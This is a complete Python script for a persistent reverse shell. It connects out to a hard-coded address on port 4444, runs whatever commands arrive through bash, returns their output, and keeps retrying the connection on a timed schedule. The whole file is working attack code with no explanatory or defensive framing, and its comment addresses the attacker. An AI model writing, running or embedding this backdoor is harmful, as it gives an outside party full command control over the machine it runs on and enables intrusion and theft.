#!/usr/bin/python3
import socket
import subprocess
import time
from datetime import datetime

# For connecting back to your machine
HOST = "192.168.178.45"
PORT = 4444

def get_retry_interval(start_time):
    """Calculate retry interval based on elapsed time"""
    elapsed_minutes = (time.time() - start_time) / 60
    
    if elapsed_minutes < 5:  # First 5 minutes
        return 5  # Retry every 5 seconds
    else:
        return 1800  # After 5 minutes, retry every 30 minutes

def connect():
    start_time = time.time()
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            
            while True:
                cmd = sock.recv(4096).decode().strip()
                if not cmd:
                    continue
                    
                if cmd.lower() == 'exit':
                    sock.close()
                    return

                # Basic command execution
                proc = subprocess.Popen(
                    cmd,
                    shell=True,
                    executable='/bin/bash',
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout + stderr
                if output:
                    sock.send(output + b"\n[END]\n")
                else:
                    sock.send(b"Command executed with no output\n[END]\n")

        except Exception as e:
            retry_interval = get_retry_interval(start_time)
            time.sleep(retry_interval)
            continue
        finally:
            try:
                sock.close()
            except:
                pass

if __name__ == "__main__":
    connect()
